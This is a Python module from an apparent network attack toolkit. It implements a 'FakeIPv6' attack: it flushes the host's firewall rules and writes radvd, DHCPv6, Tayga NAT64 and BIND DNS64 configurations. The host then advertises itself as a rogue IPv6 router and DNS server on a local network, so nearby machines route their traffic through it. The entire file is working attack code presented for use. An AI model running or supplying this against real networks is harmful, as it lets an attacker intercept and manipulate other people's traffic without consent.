#!/usr/bin/python

####################
# Module:   FakeIPv6
# Author:   J. Rieder
# Date:     2015/12/13
# Version:  1.0
#
# Description: Implementation of the FakeIPv6 Attack
#
###############################
# Log:
# 2015/12/13    J.R - Initial
################################

import os
import subprocess
import re
import colors
import attackBase

class FakeIPv6(attackBase.Attack):

	natInterface = "sBnat64"
	ipv6Prefix = "2001:db8:1:"	
	ipv6NetMask = "96"
	natPrefix = ipv6Prefix + "FFFF::/96"
	natPrefix = ipv6Prefix + "FEDC::/96"
	dnsServerIPv6 = ipv6Prefix + ":2"
	dnsServerNetMask = "64"
	dnsIP = "8.8.8.8"
	dhcp6RangeStart = ipv6Prefix + "ABCD::10"
	dhcp6RangeEnd = ipv6Prefix + "ABCD::0240"
	domainName = "securityWorkbench"
	natIP6 = ipv6Prefix + ":3"
	natSubnet = "192.168.200.0/24"
	natIP4 = "192.168.200.1"
	listenIface = "eth0"
	natSecondIP4 = ""
	
	
	dhcpConfigFile = "/etc/wide-dhcpv6/dhcp6s.conf"
	natConfigFile = "/etc/tayga.conf"
	radvdConfigFile = "/etc/radvd.conf"
	dnsConfigFile = "/etc/bind/named.conf.options"
	
	shellCol = colors.ShellColors

	def fakeIpv6Attack(self):
		self.listenIface = raw_input(self.shellCol.UNDERLINE + self.shellCol.BLUE + "\nEnter interface name used for the attack (default eth0): " + self.shellCol.ENDC)
		if len(self.listenIface) == 0:
			self.listenIface = "eth0"
		subprocess.call(["arp-scan", "--interface="+self.listenIface, "--localnet"])
		self.natSecondIP4 = raw_input(self.shellCol.UNDERLINE + self.shellCol.BLUE + "\nEnter unused IPv4 address out of the above network: " + self.shellCol.ENDC)

		
		#os.popen("/sbin/modprobe ipv6")
		# Enable IPv4 and IPv6 forwarding
		os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")
		os.popen("echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")

		# Delete existing iptables
		os.popen("/sbin/iptables -F")
		os.popen("/sbin/iptables -X")
		os.popen("/sbin/ip6tables -F")
		os.popen("/sbin/ip6tables -X")

		#os.popen("ip link set " + self.natInterface + " down")
		os.popen("/usr/sbin/tayga --rmtun")
		
		self.writeDnsConfig()
		self.writeRadvdConfig()
		self.writeDhcp6Conf()
		self.writeNatConfig()

		if self.startNat():
			subprocess.call(["service", "radvd", "stop"])
			subprocess.call(["sleep", "2"])
			subprocess.call(["service", "radvd", "start"])
			subprocess.call(["service", "bind9", "restart"])
			subprocess.call(["service", "wide-dhcpv6-server", "restart"])
			self.iptables()
			runAttack = raw_input(self.shellCol.UNDERLINE + self.shellCol.BLUE + "\nAttack running. Press Enter to stop it. " + self.shellCol.ENDC)
			#print("Attack running")
			self.stopAttack()
		else:
			print("Some failure occured while starting the attack")


	def iptables(self):

		os.popen("iptables -I FORWARD -j ACCEPT -i " + self.natInterface + " -o " + self.listenIface)
		os.popen("iptables -I FORWARD -j ACCEPT -i " + self.listenIface + " -o " + self.natInterface +  " -m state --state RELATED,ESTABLISHED")
		os.popen("iptables -t nat -I POSTROUTING -o " + self.listenIface + " -j MASQUERADE")
		os.popen("ip6tables -A OUTPUT -p icmpv6 --icmpv6-type 1 -j DROP")


	# Write the DHCP config file (default: /etc/wide-dhcpv6/dhcp6s.conf)
	def writeDhcp6Conf(self):
		confFile = open("/etc/default/wide-dhcpv6-server", 'w')
		confFile.truncate()
		# Write Interface on which the DHCP Server is working.
		confFile.write("INTERFACES=" + self.listenIface)
		confFile.close()
		
		confFile = open(self.dhcpConfigFile, 'w')
		confFile.truncate()
		
		# Write the IPv6 address of the dns the attacked network shall use.
		confFile.write("option domain-name-servers " + self.dnsServerIPv6 + ";\n")
		# Name of the new domain name.
		confFile.write("option domain-name \"" + self.domainName + "\";\n")
		# Define the used address pool for the DHCP interface. 
		confFile.write("interface " + self.listenIface + " {\n")
		confFile.write("\taddress-pool addrPool 3600;\n};\n")
		
		confFile.write("pool addrPool {\n")
		confFile.write("\trange " + self.dhcp6RangeStart +" to " + self.dhcp6RangeEnd + ";\n};\n")

		confFile.close()

	# Writes the Tayga config file (default: /etc/tayga.conf)
	def writeNatConfig(self):
		confFile = open(self.natConfigFile, 'w')
		confFile.truncate()
		
		# Virtual network interface (TUN device)
		confFile.write("tun-device " + self.natInterface + "\n")
		# IPv4 address of the virtual device (not part of the attacked network)
		confFile.write("ipv4-addr " + self.natIP4 + "\n")
		# IPv6 prefix for the virtual device
		confFile.write("prefix " + self.natPrefix + "\n")
		# Ipv4 network of virtual device
		confFile.write("dynamic-pool " + self.natSubnet)
		
		confFile.close()
		
	# Writes the radvd config file (default: /etc/radvd.conf)
	def writeRadvdConfig(self):
		confFile = open(self.radvdConfigFile, 'w')
		confFile.truncate()
		
		# Defines the interface on which the router advertisements are send.
		confFile.write("interface " + self.listenIface + "\n{\n")
		# AdvSendAdvert: indicates weather the router advertisements should be send or not.
		confFile.write("\tAdvSendAdvert on;\n")
		# Minimum time allowed between sending router advertisements in seconds.
		confFile.write("\tMinRtrAdvInterval 3;\n")
		# Maximum time allowed between sending router advertisements in seconds.
		confFile.write("\tMaxRtrAdvInterval 10;\n")
		# Router is not able to work as mobile IPv6 home agent.
		confFile.write("\tAdvHomeAgentFlag off;\n")
		# Hosts use the stateful protocol to gather further non-address information.
		confFile.write("\tAdvOtherConfigFlag on;\n")
		confFile.write("\tprefix " + self.ipv6Prefix + ":/" + self.dnsServerNetMask + "\n\t{\n")
		# This prefix can be used for on-link determination. 
		confFile.write("\t\tAdvOnLink on;\n")		
		# Prefix can be used for autonomous address configuration.
		confFile.write("\t\tAdvAutonomous on;\n")
		# Network prefix is send, not the interface address.
		confFile.write("\t\tAdvRouterAddr off;\n\t};\n")
		confFile.write("\tRDNSS " + self.dnsServerIPv6 + "\n\t{\n")
		# Time in seconds for how long rdnss entries are used for name resolution.
		confFile.write("\t\tAdvRDNSSLifetime 30;\n\t};\n};")
	
		confFile.close()

	# Writes the bind config file (default: /etc/bind/named.conf.options)
	def writeDnsConfig(self):
		dnsServers = ""

		# Get nameserver entries out of resolv.conf
		with open("/etc/resolv.conf") as resolvConf:
			for line in resolvConf:
				#tmp = dnsServers.readline()
				if "nameserver" in line:
					s = line.split("nameserver ")				
					dnsServers += s[1].split("\n")[0] + ";\n"
		
		# If no dns entry in resolv.conf, use the google dns.		
		if dnsServers == "":
			dnsServers = "8.8.8.8"

		
		confFile = open(self.dnsConfigFile, 'w')
		confFile.truncate()

		confFile.write("options {\n")
		confFile.write("\tdirectory \"/var/cache/bind\";\n")
		# Define the used dns to which requests are forwarded.
		confFile.write("\tforwarders {\n")
		confFile.write("\t\t" + dnsServers + "\n\t};\n")
		# Server will attempt to validate replies from DNSSEC enabled (signed) zones.
		confFile.write("\tdnssec-validation auto;\n")
		# The server will not answer authoritatively if requested entry is not found.		
		confFile.write("\tauth-nxdomain no;\n")
		# Bind will listen to IPv6 requests.
		confFile.write("\tlisten-on-v6 { any; };\n")
		# Bind will listen on all domains.
		confFile.write("\tallow-query { any; };\n")
		# Configures prefix to which the embedded IPv4 address is appended.
		confFile.write("\tdns64 " + self.natPrefix + " {\n")
		# DNS64 applies to all clients.
		confFile.write("\t\tclients { any; };\n")
		# New AAAA records should be generated. 
		confFile.write("\t\texclude { any; };\n\t};\n};")

		confFile.close()

	def startNat(self):
		#os.popen("ip addr flush dev " + self.listenIface)
		os.popen("ip addr add \"" + self.dnsServerIPv6 + "/" + self.dnsServerNetMask + "\" dev " + self.listenIface)
		#print("ip addr add \"" + self.dnsServerIPv6 + "/" + self.dnsServerNetMask + "\" dev " + self.listenIface)
		os.popen("/usr/sbin/tayga --mktun")
		os.popen("ip link set " + self.natInterface + " up")
		os.popen("ip addr flush dev " + self.natInterface)
		os.popen("ip addr add " + self.natSecondIP4 + " dev " + self.natInterface)
		os.popen("ip addr add " + self.natIP4 + " dev " + self.natInterface)
		os.popen("ip route flush dev " + self.natInterface)
		os.popen("ip route add " + self.natSubnet + " dev " + self.natInterface)
		os.popen("ip addr add " + self.natIP6 + " dev " + self.natInterface)
		os.popen("ip route add " + self.natPrefix + " dev " + self.natInterface)
		if os.popen("/usr/sbin/tayga"):
			return True
		else:
			return False

	def stopAttack(self):
		subprocess.call(["service", "radvd", "stop"])
		subprocess.call(["service", "bind9", "stop"])
		subprocess.call(["service", "wide-dhcpv6-server", "stop"])
		os.popen("iptables -F")
		os.popen("iptables -X")
		os.popen("ip6tables -F")
		os.popen("ip6tables -X")


	def start(self):
		self.fakeIpv6Attack()

	def help(self): pass














